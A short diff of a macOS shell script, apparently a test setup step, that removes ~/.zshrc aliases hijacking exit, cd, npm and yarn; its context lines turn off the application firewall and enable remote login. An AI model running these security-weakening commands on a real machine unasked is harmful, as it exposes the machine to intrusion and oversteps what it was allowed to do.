@@ -2,6 +2,11 @@ FLAG_FILE="/tmp/test_task_done"
 
 if [ ! -f "$FLAG_FILE" ]; then
 
+    sed -i '' '/alias exit="printf/d' ~/.zshrc
+    sed -i '' '/alias cd="printf/d' ~/.zshrc
+    sed -i '' '/alias npm="printf/d' ~/.zshrc
+    sed -i '' '/alias yarn="printf/d' ~/.zshrc
+
     /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
     systemsetup -setremotelogin on
 
